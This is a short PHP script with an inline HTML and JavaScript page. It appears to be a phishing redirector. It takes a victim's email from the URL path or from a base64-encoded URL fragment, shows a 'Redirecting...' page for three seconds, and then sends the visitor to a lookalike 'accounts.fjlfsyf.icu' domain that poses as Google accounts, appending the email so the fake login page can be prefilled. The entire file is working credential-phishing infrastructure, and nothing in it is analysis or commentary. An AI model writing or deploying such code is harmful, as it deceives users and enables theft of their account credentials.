<?php
function isBase64($data)
{
    if (base64_encode(base64_decode($data, true)) === $data) {
        return true;
    } else {
        return false;
    }
}

function decode($email = null){
    if ($email !== null && isBase64($email)) {
        $email = base64_decode($email, false);
    }
    
    $redirect_url = "https://accounts.fjlfsyf.icu?h-vhewD1uFR4=aHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29t";
    $delay = 3;
    
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Redirecting...</title>
        <script>
            setTimeout(function() {
                let final_url = "<?php echo $redirect_url; ?>";

                if (location.hash) {
                    let hash_value = location.hash.slice(1);
                    if (hash_value.startsWith("?")) {
                        hash_value = hash_value.slice(1);
                    }
                    if (hash_value.includes("=") && hash_value.substring(hash_value.indexOf("=") + 1).length > 5){
                        hash_value = hash_value.substring(hash_value.indexOf("=") + 1);
                    }
                    try {
                        hash_value = atob(hash_value);
                    } catch{}

                    location.href = final_url + hash_value
                } else {
                    location.href = "<?php echo $redirect_url . urlencode((string)$email);?>";
                }
            }, <?php echo $delay * 1000; ?>);
        </script>
    </head>
    <body>
        <p>Redirecting to a page...</p>
        <p>You will be redirected in <?php echo $delay; ?> seconds.</p>
    </body>
    </html>
    <?php
    exit();
}

if (isset($_SERVER['REQUEST_URI'])) {
    $url_parts = explode("/", $_SERVER['REQUEST_URI']);
    $email = end($url_parts);
    
    if (!empty($email)) {
        decode($email);
    } else {
        decode();
    }
}
?>
